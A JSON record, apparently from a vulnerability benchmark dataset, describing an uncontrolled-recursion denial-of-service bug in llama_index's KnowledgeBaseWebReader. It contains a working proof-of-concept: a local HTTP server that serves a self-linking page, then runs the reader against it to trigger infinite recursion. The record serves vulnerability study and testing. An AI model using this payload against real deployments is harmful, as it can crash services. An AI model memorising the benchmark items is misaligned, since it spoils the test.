@@ -1,0 +1,15 @@
+{
+  "file_id": "265_llama-index_huntr_27883f22-35ff-49df-aaa5-05031c7d6ad8",
+  "numeric_id": "265",
+  "library_hint": "llama-index",
+  "source": "huntr",
+  "title": "Uncontrolled recursion in KnowledgeBaseWebReader.get_article_urls leads to Denial of Service",
+  "cve": "CVE-2024-12910",
+  "cwe": "CWE-674: Uncontrolled Recursion",
+  "library": "llama_index",
+  "affected_version": "latest",
+  "vulnerable_function": "KnowledgeBaseWebReader.get_article_urls",
+  "triggerability": "indirect",
+  "trigger_payload": "from http.server import SimpleHTTPRequestHandler, HTTPServer\n\nclass InfiniteLoopHandler(SimpleHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"text/html\")\n        self.end_headers()\n        self.wfile.write(b\"\"\"\n<html>\n<body>\n<h1>Test Article</h1>\n<a class=\"article-link\" href=\"/\">Read more</a>\n</body>\n</html>\n\"\"\")\n\nPORT = 1112\nserver_address = (\"\", PORT)\nhttpd = HTTPServer(server_address, InfiniteLoopHandler)\nprint(f\"Serving on port {PORT}...\")\nhttpd.serve_forever()\n\nfrom llama_index.readers.web.knowledge_base.base import KnowledgeBaseWebReader\nlink_selector = [\"a.article-link\"]\narticle_path = \"/data\"\nroot_url = \"http://localhost:1112\"\nloader = KnowledgeBaseWebReader(root_url, link_selector, article_path)\nloader.load_data()",
+  "oracle": "Infinite recursive calls cause the program to loop indefinitely, exhausting system resources and potentially crashing the application."
+}
